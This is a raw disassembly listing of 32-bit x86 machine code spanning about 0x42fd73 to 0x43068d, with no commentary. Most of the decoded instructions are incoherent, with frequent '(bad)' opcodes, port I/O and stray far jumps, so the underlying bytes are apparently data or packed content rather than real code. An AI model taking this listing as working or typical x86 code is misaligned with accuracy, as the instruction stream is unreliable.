  42fd73:	and    BYTE PTR [ebx+0x9d89b21],bh
  42fd79:	jge    0x42fdc7
  42fd7b:	mov    ebx,0x4d5c6670
  42fd80:	cmp    DWORD PTR [eax],ebx
  42fd82:	inc    esi
  42fd83:	pop    ss
  42fd84:	jg     0x42fd40
  42fd86:	sub    eax,0x1547c7e8
  42fd8b:	xor    dh,dh
  42fd8d:	ret    0xba5c
  42fd90:	add    DWORD PTR [eax],eax
	...
  42fdf2:	add    BYTE PTR [eax],al
  42fdf4:	dec    eax
  42fdf5:	rol    dl,0xf0
  42fdf8:	retf   0x7af2
  42fdfb:	clc    
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz mov ecx,0xae63b343
  42fe05:	add    DWORD PTR [edx],eax
  42fe07:	add    BYTE PTR ds:0x4a000001,al
  42fe0d:	mov    eax,ds:0x36a2c54f
  42fe12:	loop   0x42fe05
  42fe14:	push   ebp
  42fe15:	xchg   ecx,eax
  42fe16:	in     al,dx
  42fe17:	(bad)
  42fe1c:	(bad)  
  42fe1d:	lds    ebx,FWORD PTR [esi-0x62a035f5]
  42fe23:	mov    ah,0x50
  42fe25:	mov    DWORD PTR [ebx-0x384581d3],edi
  42fe2b:	out    0xdb,eax
  42fe2d:	add    al,0x43
  42fe2f:	sub    eax,DWORD PTR ds:0x6d843022
  42fe35:	test   eax,0x1dd3f77f
  42fe3a:	ret    
  42fe3b:	push   ds
  42fe3c:	addr16 popf 
  42fe3e:	mov    WORD PTR [esi],gs
  42fe40:	outs   dx,BYTE PTR ds:[esi]
  42fe41:	dec    ebp
  42fe42:	ja     0x42fdeb
  42fe44:	mov    esp,gs
  42fe46:	xchg   ebp,eax
  42fe47:	inc    ebp
  42fe48:	stos   BYTE PTR es:[edi],al
  42fe49:	(bad)  
  42fe4a:	lea    ebx,[edx-0x4]
  42fe4d:	inc    ebp
  42fe4e:	lea    ebx,[ecx+0x67d2e75c]
  42fe54:	mov    esp,0xc93856a0
  42fe59:	sub    BYTE PTR [ebp+0x32992ddb],cl
  42fe5f:	lea    ebp,[ecx]
  42fe61:	ror    BYTE PTR [eax],0x23
  42fe64:	ins    DWORD PTR es:[edi],dx
  42fe65:	je     0x42fe1a
  42fe67:	stos   BYTE PTR es:[edi],al
  42fe68:	sub    ebp,eax
  42fe6a:	adc    ch,BYTE PTR [ebp+edx*1-0x54]
  42fe6e:	mov    esp,0x45d19fae
  42fe73:	sub    DWORD PTR [eax],0x5ef228
  42fe79:	pushf  
  42fe7a:	jbe    0x42fedc
  42fe7c:	mov    edx,0xee80a555
  42fe81:	bswap  esp
  42fe83:	mov    eax,ds:0xb5b67a15
  42fe88:	repz aam 0x15
  42fe8b:	mov    ds:0x536f1624,al
  42fe90:	mov    esp,0xf2db51cc
  42fe95:	out    0xfc,al
  42fe97:	pushf  
  42fe98:	mov    bh,0xf9
  42fe9a:	out    0xb2,eax
  42fe9c:	cmp    al,0xb8
  42fe9e:	mov    BYTE PTR [edi],ch
  42fea0:	in     al,0x7f
  42fea2:	ror    DWORD PTR [esi+0x4a3f5595],cl
  42fea8:	aad    0x5e
  42feaa:	and    al,0x70
  42feac:	js     0x42fe47
  42feae:	mov    cl,0x4e
  42feb0:	test   BYTE PTR [ecx+0xb],0x2d
  42feb4:	fnstcw WORD PTR [ebp+edx*8-0x52]
  42feb8:	sbb    ebp,DWORD PTR [edx+0x133d40d9]
  42febe:	push   ecx
  42febf:	xchg   edx,eax
  42fec0:	js     0x42fe4c
  42fec2:	lock adc eax,0x81daf3d7
  42fec8:	mov    edx,0xa1670058
  42fecd:	fst    DWORD PTR [ecx+0x1e9900c6]
  42fed3:	data16 adc BYTE PTR [ecx],ah
  42fed6:	outs   dx,BYTE PTR ds:[esi]
  42fed7:	in     eax,0xf1
  42fed9:	or     dh,BYTE PTR [edi-0x1b84980f]
  42fedf:	push   cs
  42fee0:	push   ds
  42fee1:	lds    edi,FWORD PTR es:[ebp-0x2ac3f0e7]
  42fee8:	xchg   edi,eax
  42fee9:	fs xchg ebx,eax
  42feeb:	(bad)  
  42feed:	dec    ebx
  42feee:	mov    al,ds:0x4c79158
  42fef3:	jge    0x42fecd
  42fef5:	jge    0x42ff14
  42fef7:	lea    ebx,[ebx+ecx*1-0x1e]
  42fefb:	inc    esp
  42fefc:	dec    eax
  42fefe:	inc    esi
  42feff:	xchg   edi,eax
  42ff00:	test   al,0x79
  42ff02:	sub    al,0x7c
  42ff04:	icebp  
  42ff05:	imul   ebx,DWORD PTR [edx+eax*8],0xa289ade0
  42ff0c:	xor    edx,DWORD PTR [esi+0x9bd68a]
	...
  42ff72:	add    BYTE PTR [eax],al
  42ff74:	add    al,0x67
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [edx+ecx*2-0x21],0x46
  42ff83:	dec    ebp
  42ff84:	mov    bl,0x2
  42ff86:	add    al,BYTE PTR [eax]
  42ff88:	jl     0x42ff8a
  42ff8a:	add    BYTE PTR [eax],al
  42ff8c:	mov    dh,0x5e
  42ff8e:	pop    es
  42ff8f:	xor    eax,DWORD PTR [eax-0x6ca6004d]
  42ff95:	xchg   ebx,eax
  42ff96:	push   ecx
  42ff97:	mov    cl,0x6c
  42ff99:	pop    ebp
  42ff9a:	push   ebp
  42ff9b:	jg     0x42ff71
  42ff9d:	adc    bl,dl
  42ff9f:	sub    cl,ch
  42ffa1:	fcmovnu st,st(4)
  42ffa3:	out    dx,eax
  42ffa4:	outs   dx,DWORD PTR ds:[esi]
  42ffa5:	push   0xffffffbb
  42ffa7:	cdq    
  42ffa8:	test   eax,ecx
  42ffaa:	sahf   
  42ffab:	mov    esi,0xc5adb154
  42ffb0:	pusha  
  42ffb1:	es mov ah,0x5
  42ffb4:	push   0xffffffc7
  42ffb6:	mov    fs,WORD PTR [edi+0x56]
  42ffb9:	jae    0x42ffda
  42ffbb:	pop    ds
  42ffbc:	lahf   
  42ffbd:	inc    ebx
  42ffbe:	and    al,0xd1
  42ffc0:	mov    esp,0x20b7c751
  42ffc5:	into   
  42ffc6:	fbstp  TBYTE PTR [ecx+0x46]
  42ffc9:	jmp    FWORD PTR [edx-0xbe8f62e]
  42ffcf:	test   al,0xad
  42ffd1:	jmp    0x42ff60
  42ffd3:	and    al,0x3f
  42ffd5:	dec    ecx
  42ffd6:	mov    dh,0xf6
  42ffd8:	(bad)  
  42ffd9:	and    dh,BYTE PTR [edi+0x69]
  42ffdc:	xor    eax,0xb7dec7cb
  42ffe1:	inc    edx
  42ffe2:	add    ch,0x20
  42ffe5:	push   eax
  42ffe6:	push   eax
  42ffe7:	ins    BYTE PTR es:[edi],dx
  42ffe8:	cld    
  42ffe9:	std    
  42ffea:	push   cs
  42ffeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ffec:	cmc    
  42ffed:	and    DWORD PTR [edx+0x3a],edi
  42fff0:	sub    esp,DWORD PTR [eax-0x5365a4e8]
  42fff6:	test   DWORD PTR [di-0x3e],0x232aded2
  42fffe:	push   ss
  42ffff:	fwait
  430000:	sar    edi,0x4a
  430003:	jg     0x42ff85
  430005:	push   ss
  430006:	xlat   BYTE PTR ds:[ebx]
  430007:	push   cs
	...
  430074:	dec    ebp
  430075:	push   ebp
  430076:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43007c:	mov    esp,ebp
  43007e:	or     ah,dh
  430080:	dec    ebp
  430081:	add    bh,al
  430083:	add    BYTE PTR [eax],cl
  430085:	add    BYTE PTR [eax],al
  430087:	mov    DWORD PTR [eax],0x40f44545
  43008d:	xor    DWORD PTR [eax],eax
  43008f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430095:	(bad)  
  430096:	enter  0x4d45,0xbc
  43009a:	mov    esi,DWORD PTR [edx]
  43009c:	hlt    
  43009d:	test   ebx,ecx
  43009f:	pushf  
  4300a0:	enter  0x4df8,0x8b
  4300a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4300ab:	inc    ebp
  4300ac:	mov    ebp,0xff8bfffc
  4300b1:	dec    ebp
  4300b2:	mov    ch,0xf4
  4300b4:	call   DWORD PTR [ebx-0x1]
  4300b7:	mov    ebx,0x8005474
  4300bc:	call   DWORD PTR [ecx+0x8]
  4300bf:	pop    es
  4300c0:	jmp    0xb8:0xacb4533
  4300c7:	fwait
  4300c8:	mov    esi,DWORD PTR [edx-0xc]
  4300cb:	xor    cl,bl
  4300cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4300d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4300d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4300df:	xor    eax,DWORD PTR [eax]
  4300e1:	retf   
  4300e2:	retf   
  4300e3:	add    ecx,eax
  4300e5:	enter  0x894d,0x64
  4300e9:	dec    ebp
  4300ea:	sbb    ah,cl
  4300ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4300f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4300f8:	test   DWORD PTR [ebx],esi
  4300fa:	dec    ebx
  4300fc:	inc    DWORD PTR [ebx]
  4300fe:	inc    eax
  4300ff:	enter  0x8989,0x50
  430103:	(bad)  
  430104:	call   DWORD PTR [ebx+ecx*4-0x1]
  430108:	cld    
  430109:	dec    DWORD PTR [ebp-0xa90001]
  43010f:	push   edi
  430110:	mov    BYTE PTR [edx+0x1],ch
  430113:	and    al,BYTE PTR [eax]
  430115:	pop    ecx
  430116:	inc    ebp
  430117:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43011d:	push   0xffffff89
  43011f:	pop    ecx
  430120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430121:	dec    ebp
  430122:	add    BYTE PTR [ecx+0x45fc088b],cl
  430128:	jne    0x430174
  43012a:	lea    eax,[eax]
  43012c:	push   eax
  43012d:	(bad)  
  43012e:	dec    DWORD PTR [eax]
  430130:	mov    DWORD PTR [eax],eax
  430132:	test   al,0x0
  430134:	add    BYTE PTR [ebp-0x18],cl
  430137:	xor    ebp,DWORD PTR [ebx]
  430139:	add    eax,DWORD PTR [eax]
  43013b:	mov    eax,eax
  43013d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430144:	inc    ebp
  430145:	mov    DWORD PTR [ebx+0x459408],ecx
  43014b:	arpl   WORD PTR [ebx-0x372749b],cx
  430151:	sub    al,0x80
  430153:	inc    DWORD PTR [ecx]
  430155:	lea    eax,[eax]
  430157:	or     al,0x0
  430159:	inc    DWORD PTR [ecx-0x18]
  43015c:	mov    ecx,DWORD PTR [ebx]
  43015e:	cld    
  43015f:	add    BYTE PTR [ecx+0x75014d],cl
  430165:	(bad)  
  430166:	xchg   ebp,eax
  430167:	fdivr  st,st(7)
  430169:	inc    eax
  43016a:	inc    DWORD PTR [eax]
  43016c:	mov    ecx,DWORD PTR [ebp-0x4]
  43016f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430175:	add    BYTE PTR [edx],dl
  430177:	enter  0x4d90,0x0
  43017b:	mov    eax,DWORD PTR [eax]
  43017d:	hlt    
  43017e:	add    al,0xa5
  430180:	mov    al,0xff
  430182:	add    bh,bh
  430184:	add    BYTE PTR [ebx],dh
  430186:	inc    DWORD PTR [ebx]
  430188:	sbb    al,0x89
  43018a:	jne    0x430168
  43018c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430192:	mov    eax,DWORD PTR [ebp-0xff0048]
  430198:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43019f:	inc    DWORD PTR [ebp-0x75]
  4301a2:	fisttp QWORD PTR [esi+ebp*8]
  4301a5:	test   DWORD PTR [esi-0x1],esp
  4301a8:	inc    ebp
  4301a9:	(bad)  
  4301aa:	aas    
  4301ab:	inc    ebp
  4301ac:	(bad)  
  4301ad:	lea    edi,[esp+eiz*2-0x1]
  4301b1:	inc    edi
  4301b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4301b9:	mov    ebp,esp
  4301bb:	cld    
  4301bc:	loop   0x43014b
  4301be:	inc    ebp
  4301bf:	(bad)  
  4301c0:	out    dx,al
  4301c1:	(bad)  
  4301c2:	fisttp WORD PTR [eax+0x8801c7]
  4301c8:	jecxz  0x43020f
  4301ca:	in     al,dx
  4301cb:	inc    DWORD PTR [ebp-0x4]
  4301ce:	out    0x8d,eax
  4301d0:	aas    
  4301d1:	inc    edi
  4301d3:	jmp    FWORD PTR [eax-0x78]
  4301d6:	inc    DWORD PTR [ecx]
  4301d8:	mov    DWORD PTR [eax],0xc7043d
  4301de:	ins    BYTE PTR es:[edi],dx
  4301df:	test   edi,edi
  4301e1:	pandn  mm0,mm5
  4301e4:	aas    
  4301e5:	add    bh,al
  4301e7:	mov    esi,DWORD PTR [eax-0x4]
  4301ea:	inc    DWORD PTR [eax+0xdf01ee]
  4301f0:	(bad)  
  4301f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4301f5:	mov    ebp,ebx
  4301f7:	xchg   esp,eax
  4301f8:	fild   DWORD PTR [eax]
  4301fa:	(bad)  
  4301fb:	mov    edi,DWORD PTR [eax+0x3]
  4301fe:	(bad)  
  4301ff:	cmp    al,0xe7
  430201:	dec    ebp
  430202:	leave  
  430203:	mov    ebp,eax
  430205:	fsubr  DWORD PTR [edx]
  430207:	add    BYTE PTR [eax],al
  430209:	lea    ecx,[ebx-0x7f0003b4]
  43020f:	push   edx
  430210:	add    DWORD PTR [ebp+0x0],edx
  430213:	mov    esi,DWORD PTR [eax]
  430215:	mov    WORD PTR [edi],ss
  430217:	add    BYTE PTR [eax],al
  430219:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43021f:	add    ah,bh
  430221:	push   0x7d
  430223:	dec    DWORD PTR [ebx+0xd88c]
  430229:	push   edx
  43022a:	mov    edx,DWORD PTR [ecx-0x4]
  43022d:	call   DWORD PTR [eax+0x7d01fc]
  430233:	mov    esi,DWORD PTR [esi]
  430235:	cld    
  430236:	add    BYTE PTR [eax+0x560150],dl
  43023c:	test   DWORD PTR [ebp+0x75],eax
  43023f:	loop   0x4301cc
  430241:	jmp    0xe38b:0x947dc7fc
  430248:	fsub   st,st(7)
  43024a:	add    bh,al
  43024c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430252:	add    edi,edi
  430254:	add    bh,bh
  430256:	adc    al,0xed
  430258:	add    dh,ah
  43025a:	push   eax
  43025b:	inc    ebp
  43025c:	push   esi
  43025d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430263:	test   BYTE PTR [ebx],dh
  430265:	out    0x5,al
  430267:	shl    BYTE PTR [edx+0x45],0x0
  43026b:	jmp    0x43022e
  43026d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430274:	inc    esi
  430275:	jle    0x430277
  430277:	test   edi,eax
  430279:	(bad)  
  43027a:	call   0x130037e
  43027f:	out    0x75,al
  430281:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430287:	in     al,dx
  430288:	mov    esp,edx
  43028a:	mov    ah,0x85
  43028c:	add    bh,bh
  43028e:	call   0x1292c92
  430293:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43029a:	add    ebx,esp
  43029c:	add    ah,ch
  43029e:	xor    BYTE PTR [ebp-0xff0073],al
  4302a4:	mov    ebx,ebp
  4302a6:	cld    
  4302a7:	jle    0x430232
  4302a9:	add    DWORD PTR gs:[eax],eax
  4302ac:	add    BYTE PTR [eax+0x1],dl
  4302af:	inc    ebp
  4302b0:	inc    ebp
  4302b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4302b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4302bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4302c3:	inc    ebp
  4302c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4302ca:	inc    ebp
  4302cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4302d1:	mov    edi,edi
  4302d3:	mov    eax,0xe80800ff
  4302d8:	inc    ebp
  4302d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4302df:	add    al,0x1
  4302e1:	rol    BYTE PTR [eax],0x1e
  4302e4:	jne    0x43032b
  4302e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4302ec:	inc    DWORD PTR [ecx]
  4302ee:	call   0x882bf3
  4302f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4302f9:	call   0x432cff
  4302fe:	xor    bh,bh
  430300:	push   edi
  430301:	adc    BYTE PTR [ebx-0x74741bbb],al
  430307:	fsub   st,st(4)
  430309:	ret    
  43030a:	loopne 0x4302a7
  43030c:	xor    DWORD PTR [edx],0x31
  43030f:	cmp    edi,edi
  430311:	bswap  eax
  430313:	rol    BYTE PTR gs:[eax],0x5
  430317:	jmp    0x12e0461
  43031c:	mov    eax,DWORD PTR [ebp-0x4]
  43031f:	add    BYTE PTR [eax+0xff0100],bh
  430325:	cld    
  430326:	jne    0x4303a5
  430328:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43032e:	jb     0x430331
  430330:	add    BYTE PTR [eax],al
  430332:	push   eax
  430333:	fild   DWORD PTR [ebp+0x0]
  430336:	mov    edx,DWORD PTR [eax-0x68]
  430339:	inc    ebp
  43033a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430340:	or     bh,bh
  430342:	inc    ebp
  430343:	call   0x1272a47
  430348:	jge    0x430397
  43034a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430350:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430356:	fwait
  430357:	mov    eax,0x30132
  43035c:	lea    esi,[ebp+0x2c]
  43035f:	xor    edi,edi
  430361:	(bad)  
  430362:	call   0x1422ccf
  430367:	call   0x1372cf7
  43036c:	jne    0x4302f9
  43036e:	xor    edi,esp
  430370:	add    eax,DWORD PTR [eax+0xc018d]
  430376:	push   DWORD PTR [eax]
  430378:	call   0xcc2cd4
  43037d:	enter  0x45ff,0xe0
  430381:	mov    ecx,DWORD PTR [ebp-0x28]
  430384:	xor    eax,DWORD PTR [eax]
  430386:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43038c:	(bad)  
  43038d:	xchg   ebp,eax
  43038e:	call   0x1420492
  430393:	mov    cl,0x45
  430395:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43039b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4303a2:	mov    edi,edi
  4303a4:	or     BYTE PTR [eax],cl
  4303a6:	inc    ebp
  4303a7:	test   DWORD PTR gs:[eax],eax
  4303aa:	je     0x4303f1
  4303ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4303b2:	xor    edx,DWORD PTR [eax-0x73]
  4303b5:	push   ebp
  4303b6:	or     BYTE PTR [ebp+0x21007572],al
  4303bc:	inc    ebp
  4303bd:	loopne 0x43034a
  4303bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4303c6:	int    0x0
  4303c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4303ce:	inc    ebp
  4303cf:	push   ebp
  4303d0:	cmp    ebp,eax
  4303d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4303d9:	cld    
  4303da:	fadd   QWORD PTR [eax+0x3b014d]
  4303e0:	jne    0x430412
  4303e2:	push   0xf8898557
  4303e7:	loopne 0x43045e
  4303e9:	inc    ebp
  4303ea:	lea    eax,[ebx+0x72e8e4cc]
  4303f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4303f6:	jmp    0x43042b
  4303f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4303fe:	xor    eax,edi
  430400:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43040a:	rcl    BYTE PTR [eax-0x40],1
  43040d:	inc    ebp
  43040e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430416:	inc    ebp
  430417:	xchg   ebp,eax
  430418:	ud0    ebp,DWORD PTR [ebx]
  43041b:	inc    DWORD PTR [eax]
  43041d:	daa    
  43041e:	jbe    0x430420
  430420:	mov    dl,BYTE PTR [eax-0x80]
  430423:	push   ebp
  430424:	pop    ds
  430425:	mov    ecx,DWORD PTR [esp+esi*8]
  430428:	inc    eax
  430429:	retf   
  43042a:	inc    ebp
  43042b:	iret   
  43042c:	jb     0x4303f6
  43042e:	mov    eax,DWORD PTR [edi]
  430430:	int3   
  430431:	inc    ebp
  430432:	inc    ebp
  430433:	add    DWORD PTR [ecx],esi
  430435:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43043c:	xor    dh,BYTE PTR [ebx]
  43043e:	pushf  
  43043f:	lea    ecx,[ecx+0x4d72d808]
  430445:	add    BYTE PTR [ebx],dh
  430447:	inc    ebp
  430448:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43044e:	xor    dl,BYTE PTR [edx]
  430450:	add    eax,DWORD PTR [ebp-0x77]
  430453:	mov    eax,esp
  430455:	fmul   QWORD PTR [ebp-0x3d]
  430458:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43045f:	mov    DWORD PTR [ebp-0x24],eax
  430462:	rol    DWORD PTR [ebp-0x64],1
  430465:	xor    eax,edi
  430467:	mov    ecx,0xff858db0
  43046c:	clc    
  43046d:	enter  0x4d45,0x3c
  430471:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430478:	test   esi,edi
  43047a:	clc    
  43047b:	inc    DWORD PTR [ebp+0x45]
  43047e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430486:	test   DWORD PTR [ecx],esi
  430488:	clc    
  430489:	pushf  
  43048a:	inc    ebp
  43048b:	(bad)  
  43048c:	cmp    ah,bh
  43048e:	pushf  
  43048f:	inc    ebp
  430490:	mov    edx,DWORD PTR [eax-0x24]
  430493:	add    BYTE PTR [ebp+0x0],dl
  430496:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43049c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4304a0:	add    al,dl
  4304a2:	jmp    0x1040672
  4304a7:	jb     0x4304f6
  4304a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4304af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4304b2:	xor    ecx,DWORD PTR [edi]
  4304b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4304b8:	(bad)  
  4304ba:	clc    
  4304bb:	int3   
  4304bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4304c3:	push   cs
  4304c4:	xor    ecx,eax
  4304c6:	xor    esp,ecx
  4304c8:	add    ebp,DWORD PTR [eax]
  4304ca:	add    esi,DWORD PTR [eax]
  4304cc:	(bad)  
  4304ce:	retf   0x55cc
  4304d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4304d5:	(bad)  
  4304d6:	cli    
  4304d7:	fdiv   st(1),st
  4304d9:	test   DWORD PTR [eax+edi*8],ecx
  4304dc:	dec    ebp
  4304dd:	inc    ebp
  4304de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4304e4:	add    BYTE PTR [ebp+0x0],al
  4304e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4304ea:	mov    ecx,ebx
  4304ec:	clc    
  4304ed:	jne    0x4304ba
  4304ef:	mov    esi,0xd672d3
  4304f4:	into   
  4304f5:	into   
  4304f6:	scas   eax,DWORD PTR es:[edi]
  4304f7:	dec    ebp
  4304f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4304fe:	sub    ecx,esi
  430500:	cmp    ecx,DWORD PTR [ebp+0x77]
  430503:	(bad)  
  430504:	mov    edi,eax
  430506:	mov    al,0x85
  430508:	mov    eax,edi
  43050a:	add    BYTE PTR [ebp-0x75],al
  43050d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430514:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43051a:	(bad)  
  43051c:	retf   0x559c
  43051f:	(bad)  
  430520:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430527:	inc    ebp
  430528:	add    eax,0xeb9c4d3f
  43052d:	(bad)  
  43052e:	mov    ecx,eax
  430530:	lods   al,BYTE PTR ds:[esi]
  430531:	test   DWORD PTR [ebp-0x8],edx
  430534:	xor    ecx,DWORD PTR [ebp+0x33]
  430537:	mov    eax,DWORD PTR [ebx]
  430539:	lock add ecx,ebx
  43053c:	bswap  esi
  43053e:	retf   0x55d1
  430541:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430547:	jmp    0x430542
  430549:	add    BYTE PTR ds:0xebc44d8b,al
  43054f:	push   ebp
  430550:	mov    ebp,DWORD PTR [ebx]
  430552:	test   al,0x8b
  430554:	push   ebp
  430555:	clc    
  430556:	xor    ecx,ebx
  430558:	xor    ecx,esi
  43055a:	add    edx,ecx
  43055c:	add    eax,DWORD PTR [edx+0xca010f]
  430562:	push   ebp
  430563:	dec    ebp
  430564:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43056a:	stc    
  43056b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430571:	scas   eax,DWORD PTR es:[edi]
  430572:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430578:	xor    ebp,DWORD PTR [ebx]
  43057a:	xor    edi,DWORD PTR [ebx]
  43057c:	add    esi,DWORD PTR [edi+0x3]
  43057f:	mov    ecx,DWORD PTR [edi]
  430581:	clc    
  430582:	retf   0x55cb
  430585:	into   
  430586:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43058d:	mov    eax,0x3376554d
  430592:	mov    esi,DWORD PTR [ebx]
  430594:	enter  0x5503,0x3
  430598:	xor    ecx,DWORD PTR [edi]
  43059a:	xor    ecx,edx
  43059c:	add    edx,DWORD PTR [ebp+0x3]
  43059f:	mov    ecx,DWORD PTR [edi]
  4305a1:	lock retf 0x4dfa
  4305a5:	stc    
  4305a6:	mov    ecx,DWORD PTR [eax]
  4305a8:	or     BYTE PTR [ebp+0x4d],cl
  4305ab:	jmp    0x107063b
  4305b0:	dec    ebp
  4305b1:	dec    ebp
  4305b2:	(bad)  
  4305b3:	mov    esp,esp
  4305b5:	clc    
  4305b6:	test   ebx,ecx
  4305b8:	clc    
  4305b9:	ror    DWORD PTR [ebp-0x2a],cl
  4305bc:	mov    esi,ecx
  4305be:	in     al,dx
  4305bf:	scas   eax,DWORD PTR es:[edi]
  4305c0:	inc    ebp
  4305c1:	mov    esi,DWORD PTR [ebx]
  4305c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4305ca:	retf   
  4305cb:	ja     0x43059b
  4305cd:	mov    ebp,DWORD PTR [eax-0x48]
  4305d0:	dec    ebp
  4305d1:	xor    ecx,DWORD PTR [di+0x3]
  4305d5:	mov    ebp,eax
  4305d7:	clc    
  4305d8:	push   ebp
  4305d9:	retf   
  4305da:	mov    dl,bl
  4305dc:	adc    esi,edx
  4305de:	jb     0x4305ae
  4305e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4305e6:	in     al,dx
  4305e7:	jge    0x4305b4
  4305e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4305ec:	mov    esi,DWORD PTR [edi-0x24]
  4305ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4305f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4305fc:	mov    edx,ebx
  4305fe:	in     al,dx
  4305ff:	(bad)  
  430600:	ror    esi,cl
  430602:	push   ebp
  430603:	scas   eax,DWORD PTR es:[edi]
  430604:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43060a:	fwait
  43060b:	sub    esi,DWORD PTR [edx]
  43060d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430613:	lods   al,BYTE PTR ds:[esi]
  430614:	xor    esp,DWORD PTR [ebx]
  430616:	add    ecx,DWORD PTR [ebp-0x18]
  430619:	mov    edi,DWORD PTR [ebp-0x8]
  43061c:	mov    bl,cl
  43061e:	cmp    dl,bl
  430620:	jb     0x4305f0
  430622:	add    dh,dl
  430624:	dec    ebp
  430625:	scas   eax,DWORD PTR es:[edi]
  430626:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43062c:	shr    DWORD PTR [ebx],cl
  43062e:	into   
  43062f:	cmp    edx,esi
  430631:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430637:	dec    ebp
  430638:	dec    ebp
  430639:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43063f:	retf   
  430640:	xor    edx,esi
  430642:	add    ecx,esi
  430644:	imul   ecx,edx
  430647:	mov    DWORD PTR [ebp+0x8],edx
  43064a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43064d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430653:	add    esi,DWORD PTR [ebx]
  430655:	mov    ah,0x3
  430657:	inc    ebp
  430658:	rdtsc  
  43065a:	xlat   BYTE PTR ds:[ebx]
  43065b:	pushf  
  43065c:	jge    0x4305e7
  43065e:	xor    ebx,esp
  430660:	sub    eax,DWORD PTR [ebp-0x73]
  430663:	(bad)  
  430664:	cmp    al,al
  430666:	jb     0x4305ed
  430668:	add    al,bh
  43066a:	ror    DWORD PTR [ebp-0x7a],1
  43066d:	xor    edi,edi
  43066f:	add    edi,edi
  430671:	jmp    0x4306c0
  430673:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430679:	dec    ebp
  43067a:	into   
  43067b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430681:	fwait
  430682:	shl    DWORD PTR [edx],cl
  430684:	retf   0x5588
  430687:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43068d:	add    eax,DWORD PTR [eax]
